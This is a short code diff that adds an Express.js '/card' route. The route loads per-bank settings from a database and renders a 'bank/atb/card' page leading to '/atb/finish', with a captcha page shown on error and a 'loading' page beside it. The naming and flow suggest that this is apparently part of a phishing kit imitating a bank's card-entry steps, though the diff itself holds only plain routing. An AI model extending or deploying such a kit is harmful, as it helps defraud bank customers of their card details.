@@ -7,6 +7,18 @@ const getId = 1;
 
 const pool = new Pool(dbConfig);
 
+router.get('/card', async (req, res) => {
+    try {
+        const result = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);
+
+        res.render('bank/atb/card/index', { navig: "/atb/finish", atb: result.rows[0].data.settings.atb});
+
+    } catch (error) {
+        console.log(error);
+        res.render('captcha/index');
+    }
+})
+
 router.get('/loading', async (req, res) => {
     res.render('bank/atb/loading/index');
 })
